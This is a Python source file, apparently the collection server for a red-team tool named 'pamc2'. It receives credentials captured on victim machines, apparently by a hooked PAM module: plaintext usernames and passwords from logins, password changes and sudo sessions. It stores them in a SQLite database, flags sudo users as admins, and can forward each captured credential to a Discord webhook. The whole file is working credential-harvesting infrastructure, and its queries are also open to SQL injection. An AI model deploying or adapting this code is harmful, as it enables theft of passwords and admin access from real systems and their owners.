import os
import socket
import sqlite3
import argparse
import requests
import threading
from dotenv import load_dotenv

def server_args():
    parser = argparse.ArgumentParser(description="Server meant for use with pamc2")
    parser.add_argument('-p', '--port', metavar="<LISTENING PORT>", help="Port number to listen on (default 5000)", 
                        type=int, dest="port", action="store", default="5000")
    parser.add_argument('--discord', action="store_true", help="Enable Discord Webhook (set WEBHOOK_URL env var)")
    parser.add_argument('--no-db', dest="nodb", action="store_true", help="Run the server without utilizing the database (cannot be used with --only-new)")
    parser.add_argument('--only-new', dest="onlynew", action="store_true", help="Only output new information (cannot be used with --no-db)")
    return parser.parse_args()

def send_discord(addr, data):
    hook_data = {
        'content': data,
        'username': 'kms bot',
        'avatar_url': 'https://cdn.discordapp.com/emojis/1203535228975448094.webp',
        'embeds': [{
            'description': "type shit",
            'color': 15258703
        }]
    }

    response = requests.post(os.getenv('WEBHOOK_URL'), json=hook_data)

def write_db(addr, data):
    conn = sqlite3.connect('logins.db')
    cursor = conn.cursor()

    ip = addr[0]
    message = data.split("-")[1].split(":")[0].strip()
    username = data.split("-")[1].split(":")[1].strip()
    password = data.split("-")[1].split(":")[2].strip()

    if (message == "USER AUTHENTICATED" or message == "USER CHANGED PASSWORD"):
        message_type = 1
    elif (message == "SUDO SESSION OPENED"):
        message_type = 2
    else:
        message_type = -1

    cursor.execute(f'''
    CREATE TABLE IF NOT EXISTS passwords(
        ip TEXT NOT NULL,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        known_admin INTEGER DEFAULT 0,
        PRIMARY KEY (ip, username)
    ); ''')

    user_in_table = conn.execute(f'''
    SELECT password, known_admin FROM passwords
    WHERE username = '{username}' AND ip = '{ip}'; ''')

    userexists = [x for x in user_in_table]

    retval = 0
    if (message_type == 1): # authenticated/chpasswd
        
        if (len(userexists) == 0):
            cursor.execute(f'''
            INSERT INTO passwords(ip, username, password)
            VALUES ('{ip}', '{username}', '{password}');
            ''')
            retval = 1

        elif (userexists[0][0] != password):
            cursor.execute(f'''
            UPDATE passwords
            SET password = '{password}'
            WHERE username = '{username}';
            ''')
            retval = 1

        elif (userexists[0][0] == password):
            retval = 0

        else:
            print("unknown error adding authenticated user to database")
            retval = -1
    
    elif (message_type == 2): # sudo

        if (len(userexists) != 0):
            if (userexists[0][1] != 1):
                cursor.execute(f'''
                UPDATE passwords
                SET known_admin = 1
                WHERE username = '{username}';
                ''')
                retval = 1
        else:
            print("no clue how you got here (user got root without authenticating)")
            retval = -1

    else:
        print("Unknown Error adding user to database")
        retval = -1

    conn.commit()
    conn.close()

    return retval

def handle_client(lock, c, addr, cmd_args):
    data = c.recv(1024).decode()

    if (not cmd_args.onlynew):
        print(f"Received from {addr} - {data}")

    lock.acquire()

    retval = 0
    if (not cmd_args.nodb):
        retval = write_db(addr, data)
    
    if (cmd_args.onlynew and retval == 1):
        print(f"Received from {addr} - {data}")

    if (cmd_args.discord and not cmd_args.onlynew):
        send_discord(addr, data)
    elif (cmd_args.discord and retval == 1):
        send_discord(addr, data)
    
    lock.release()

    c.close()

def main():
    load_dotenv()
    cmd_args = server_args()

    if (cmd_args.discord and not os.getenv("WEBHOOK_URL")):
        print("FATAL ERROR: You must set a WEBHOOK_URL environment variable to use --discord! Please either create a .env file with the WEBHOOK_URL or set the environment variable globally to use this setting.")
        exit(1)

    if (cmd_args.nodb and cmd_args.onlynew):
        print("FATAL ERROR: You cannot run no-db and only-new mode at the same time! Database checking is required for checking if request is new!")
        exit(1)

    server_socket = socket.socket()
    print("Created socket")

    server_socket.bind(('', cmd_args.port))
    server_socket.listen()
    print(f"Server listening for incoming connections on port {cmd_args.port}...")

    lock = threading.Lock()

    while True:
        client_socket, addr = server_socket.accept()
        client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args))
        client_thread.start()

# def main():
#     write_db(('10.0.10.208', '21314'), "10.0.10.208 - USER AUTHENTICATED: ccdc:password")
#     write_db(('10.0.10.208', '97123'), "10.0.10.208 - USER AUTHENTICATED: ccdc:password")
#     write_db(('10.0.10.208', '12356'), "10.0.10.208 - USER CHANGED PASSWORD: ccdc:newpassword")
#     write_db(('10.0.10.208', '97123'), "10.0.10.208 - USER AUTHENTICATED: ccdc:newpassword")
#     write_db(('10.0.10.208', '82734'), "10.0.10.208 - SUDO SESSION OPENED: ccdc::")
#     write_db(('10.0.10.208', '97123'), "10.0.10.208 - USER AUTHENTICATED: bob:bob123")

if (__name__ == '__main__'):
    main()